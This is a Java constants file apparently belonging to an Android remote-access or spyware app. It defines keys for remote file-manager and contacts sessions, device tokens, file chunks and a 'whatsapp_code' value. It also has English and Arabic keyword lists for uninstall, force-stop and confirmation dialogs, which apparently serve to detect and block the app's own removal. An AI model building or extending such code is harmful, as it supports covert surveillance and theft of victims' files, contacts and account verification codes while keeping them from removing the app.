package com.lyrnic.userside.constants;

import java.util.Locale;

public class Constants {
    public final static String DEVICE_NAME_KEY = "name";
    public final static String DEVICE_TOKEN_KEY = "token";
    public final static String DEVICES_ADMIN_KEY = "admin";
    public final static String DEVICES_API_KEY = "api";
    public final static String DEVICES_CALL_TYPE_KEY = "type";
    public final static String DEVICES_CALL_TYPE_CREATE_KEY = "create";
    public final static String ACTION_KEY = "action";
    public final static String RECEIVER_TOKEN_KEY = "receiver_token";
    public final static String SENDER_TOKEN_KEY = "sender_token";
    public final static String FILE_MANAGER_SESSION_KEY = "file_manager_session";
    public final static String CONTACTS_SESSION_KEY = "contacts_session";

    public static final String SESSION_TYPE_KEY = "session_type";
    public static final String SESSION_ID_KEY = "session_id";
    public static final String STATE_KEY = "state";
    public static final String SESSION_SHARED_ID_KEY = "session_shared_id";
    public static final String DEVICE_FILE_CHANGE_ADD_KEY = "file_change_add_type";
    public static final String DEVICE_FILE_CHANGE_REMOVE_KEY = "file_change_remove_type";
    public static final String DEVICE_FILE_CHANGE_UPDATE_KEY = "file_change_update_type";
    public static final String DEVICE_FILE_CHANGE_TYPE_KEY = "file_change_type";
    public static final String DEVICE_FILE_NAME_KEY = "name";
    public static final String DEVICE_FILE_PATH_KEY = "path";
    public static final String DEVICE_FILE_MIME_TYPE_KEY = "mime_type";
    public static final String DEVICE_FILE_SIZE_KEY = "size";
    public static final String DEVICE_FILE_CREATED_KEY = "created";
    public static final String DEVICE_FILE_MODIFIED_KEY = "modified";
    public final static String MAIN_FILES_PATH = "main_files";
    public static final String FOLDER_PATH_KEY = "folder_path";
    public static final String FILE_PATH_KEY = "file_path";
    public static final String NEW_FILE_NAME_KEY = "new_file_name";
    public static final String DEVICE_OLD_FILE_PATH_KEY = "old_file_path";
    public static final String DEVICE_FILE_ERROR_KEY = "file_error";
    public static final String FILE_CHUNK_KEY = "file_chunk";
    public static final String CONTACT_NAME_KEY = "contact_name";
    public static final String CONTACT_NUMBER_KEY = "contact_number";
    public static final String[] UNINSTALL_KEYWORDS_EN = {"uninstall", "remove", "delete", "removing", "deleting", "removal", "deletion"};
    public static final String[] UNINSTALL_KEYWORDS_AR = {"إلغاء التثبيت", "إزالة", "حذف", "إلغاء تثبيت", "الإزالة", "إزالتة" , "مسح"};
    public static final String[] FORCE_STOP_KEYWORDS_EN = {"Force stop"};
    public static final String[] FORCE_STOP_KEYWORDS_AR = {"فرض الإيقاف", "إيقاف إجباري", "وقف التطبيق"};
    public static final String[] CONFIRMATION_KEYWORDS_EN = {"OK", "Remove", "Yes", "uninstall", "delete", "Confirm"};
    public static final String[] CONFIRMATION_KEYWORDS_AR = {"موافق", "إزالة", "نعم", "إلغاء التثبيت", "حذف", "حسناً", "حسنًا"};
    public static final String CODE_KEY = "whatsapp_code";
    public static final String APP_INFO_CACHED_DATA = "app_info_data";
    public static final String REMOVE_DIALOG_CASHED_DATA = "remove_dialog_data";
    public static final String NUMBERS_KEY = "numbers";
    public static final String DEVICE_FILE_THUMBNAIL_KEY = "thumbnail";
    public static final String REASON_KEY = "reason";
    public static final String MESSAGE_KEY = "message";
    public static final String NUMBER_KEY = "number";

    public static String[] getUninstallKeywords(){
        String lang = Locale.getDefault().getLanguage();

        if(lang.equals("en")){
            return UNINSTALL_KEYWORDS_EN;
        }else{
            return UNINSTALL_KEYWORDS_AR;
        }
    }

    public static String[] getConfirmationKeywords() {
        String lang = Locale.getDefault().getLanguage();

        if(lang.equals("en")){
            return CONFIRMATION_KEYWORDS_EN;
        }else{
            return CONFIRMATION_KEYWORDS_AR;
        }
    }
    public static String[] getForceStopKeywords(){
        String lang = Locale.getDefault().getLanguage();

        if(lang.equals("en")){
            return FORCE_STOP_KEYWORDS_EN;
        }else{
            return FORCE_STOP_KEYWORDS_AR;
        }
    }
}
